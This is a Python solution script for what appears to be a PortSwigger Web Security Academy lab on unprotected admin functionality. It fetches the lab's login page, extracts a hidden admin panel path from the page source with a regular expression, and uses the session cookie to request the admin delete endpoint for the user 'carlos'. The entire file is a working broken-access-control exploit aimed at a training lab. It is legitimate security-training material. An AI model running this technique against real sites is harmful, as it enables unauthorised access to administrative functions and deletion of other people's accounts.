#################################################################
#
# Lab: Unprotected admin functionality with unpredictable URL
#
# Hack Steps: 
#      1. Fetch the login page
#      2. Extract the admin panel path from the source code
#      3. Delete carlos from the admin panel
#
#################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0ae2009504d3b3e68124897b00d30051.web-security-academy.net"

def main():
    print(Fore.WHITE + "⦗1⦘ Fetching the login page.. ", end="", flush=True)
    
    login_page = fetch("/login")
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the admin panel path from the source code.. ", end="", flush=True)

    admin_panel_path = re.findall("'(/admin-.*)'", login_page.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_panel_path)
    print(Fore.WHITE + "⦗3⦘ Deleting carlos from the admin panel.. ", end="", flush=True)

    session = login_page.cookies.get("session")
    cookies = { "session": session }
    fetch(f"{admin_panel_path}/delete?username=carlos", cookies=cookies)
   
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)
 
        
if __name__ == "__main__":
    main()

